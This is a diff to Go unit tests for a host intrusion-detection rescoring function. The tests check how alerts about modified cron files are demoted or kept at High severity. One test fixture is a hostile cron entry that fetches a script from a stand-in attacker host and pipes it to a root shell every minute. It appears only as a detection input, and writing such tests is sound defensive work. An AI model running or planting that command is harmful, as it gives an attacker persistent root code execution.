@@ -160,7 +160,7 @@ func TestRescoreSensitiveDemotesInPkgWindow(t *testing.T) {
 	in := alert.Finding{Severity: alert.High, Check: "sensitive_file_modified"}
 	cron := []byte("0 16 * * * root /usr/sbin/cl-smart-advice update-advices-metadata\n")
 
-	out := rescoreSensitive(in, "cron", cron, 0, time.Now())
+	out := rescoreSensitive(in, "cron", cron, 0, false, time.Now())
 	if out.Severity != alert.Warning {
 		t.Fatalf("expected Warning within pkg window for benign cron, got %v", out.Severity)
 	}
@@ -182,7 +182,7 @@ func TestRescoreSensitiveDangerTokensVetoDemote(t *testing.T) {
 	in := alert.Finding{Severity: alert.High, Check: "sensitive_file_modified"}
 	cron := []byte("* * * * * root curl http://evil.example/x | sh\n")
 
-	out := rescoreSensitive(in, "cron", cron, 0, time.Now())
+	out := rescoreSensitive(in, "cron", cron, 0, false, time.Now())
 	if out.Severity != alert.High {
 		t.Fatalf("danger tokens must veto demote even inside pkg window, got %v", out.Severity)
 	}
@@ -194,7 +194,7 @@ func TestRescoreSensitiveOutsidePkgWindowKeepsHigh(t *testing.T) {
 	t.Cleanup(func() { pkgManagerLogs = oldPaths })
 
 	in := alert.Finding{Severity: alert.High}
-	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 0, time.Now())
+	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 0, false, time.Now())
 	if out.Severity != alert.High {
 		t.Fatalf("no pkg activity must not demote, got %v", out.Severity)
 	}
@@ -215,7 +215,7 @@ func TestRescoreSensitiveAncestryHookDemotes(t *testing.T) {
 	t.Cleanup(func() { AncestryProvenance = oldProbe })
 
 	in := alert.Finding{Severity: alert.High}
-	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 4242, time.Now())
+	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 4242, false, time.Now())
 	if out.Severity != alert.Warning {
 		t.Fatalf("ancestry hint must demote, got %v", out.Severity)
 	}
@@ -231,7 +231,7 @@ func TestRescoreSensitiveAncestryHookNilSafe(t *testing.T) {
 	t.Cleanup(func() { AncestryProvenance = oldProbe })
 
 	in := alert.Finding{Severity: alert.High}
-	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 9999, time.Now())
+	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 9999, false, time.Now())
 	if out.Severity != alert.High {
 		t.Fatalf("nil AncestryProvenance must be safe and not demote, got %v", out.Severity)
 	}
@@ -243,7 +243,7 @@ func TestRescoreSensitiveAncestryDangerVeto(t *testing.T) {
 	t.Cleanup(func() { AncestryProvenance = oldProbe })
 
 	in := alert.Finding{Severity: alert.High}
-	out := rescoreSensitive(in, "cron", []byte("* * * * * root /tmp/x.sh\n"), 1, time.Now())
+	out := rescoreSensitive(in, "cron", []byte("* * * * * root /tmp/x.sh\n"), 1, false, time.Now())
 	if out.Severity != alert.High {
 		t.Fatalf("danger tokens veto ancestry-based demote, got %v", out.Severity)
 	}
